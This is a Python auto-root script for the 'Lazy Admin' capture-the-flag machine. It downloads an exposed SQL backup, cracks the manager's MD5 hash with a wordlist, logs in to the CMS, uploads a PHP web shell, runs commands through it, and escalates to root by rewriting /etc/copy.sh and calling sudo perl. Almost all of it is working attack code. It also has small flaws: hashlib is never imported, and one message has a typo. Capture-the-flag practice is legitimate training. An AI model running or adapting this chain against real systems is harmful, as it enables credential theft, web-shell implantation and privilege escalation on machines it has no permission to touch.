import requests 
from pwn import *
import re
import time


print('''\n\n          Lazy Admin auto root script
					                  -Coded by Darkider88 & Valerie23''')

print('\n----------------------------------------------')
hostt = str(input("Enter target IP: "))
host = hostt.rstrip("\n")


def webenum(host):
	
    page = requests.get("http://{}/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql".format(host))
    hashe = re.findall(r'(?i)(?<![a-z0-9])[a-f0-9]{32}(?![a-z0-9])', page.content.decode())
    print(' [+] Found Manager hash: {}'.format(hashe[0]))
    print(" [+] Cracking the password..")
    password = crack(hashe[0])
    print(' [+] Cracked: {}'.format(password))
    login(password,host)
    

def crack(h):
    #wlist = input("Enter the path for wordlist")
    try:
        file = open('/usr/share/set/src/fasttrack/wordlist.txt',"r",encoding='utf-8').read()
    except IOError:
        print('Cannot open the file')
        exit()
    password = ''
    for i in file.split("\n"):
        myhash = hashlib.md5(i.encode())        
        if(h == myhash.hexdigest()):
            password = i
    
    if(password):
        return password
    else:
        return 'Password123'
        
def login(password,host):
    s = requests.Session()

    url = 'http://{}/content/as/?type=signin'.format(host)
    data = {'user':'manager' , 'passwd': password , 'rememberMe' : ''}
    
    request = s.post(url,data = data)
    
    if ('Login success' in request.text):
        print(' [+] Login Success')
    else:
        print(' [-] Login failed')
     
    url2 = 'http://{}/content/as/?type=media_center&mode=upload'.format(host)
    
    try:
        file = {'upload[]' : open("shell.phtml" , "rb") }
    except IOError:
        print("cannot open php shell file")
        exit()
        
    request2 = s.post(url2 , files=file)
    
    if (request2.status_code == 200):
        print(" [+] shell uploaded successfully")
        
        rev_shell(host)  
            
    else:
        print(" [-] failed to upload shell") 
        
        
        
def rev_shell(host):
    print(" [+] Accessing the reverse shell")

    request = requests.get(f'http://{host}/content/attachment/shell.phtml?cmd=whoami')
    if(request.status_code == 200):
    	print("[+] successfully connected to")
    	print("[+] whoami: {}".format(request.content.decode()))
    
    r1 = requests.get(f'http://{host}/content/attachment/shell.phtml?cmd=cat+/home/itguy/user.txt')
    print("[+] User flag: {}".format(r1.content.decode()))
    
    print("[+} Going for root")

    print("[+] Preparing the stage for getting the root")
    r2 = requests.get(f'http://{host}/content/attachment/shell.phtml?cmd=echo+"cat+/root/root.txt"+>+/etc/copy.sh')

    r3 = requests.get(f'http://{host}/content/attachment/shell.phtml?cmd=sudo+/usr/bin/perl+/home/itguy/backup.pl')
    
    print('[+] Root flag: {}'.format(r3.content.decode()))


    

webenum(host)
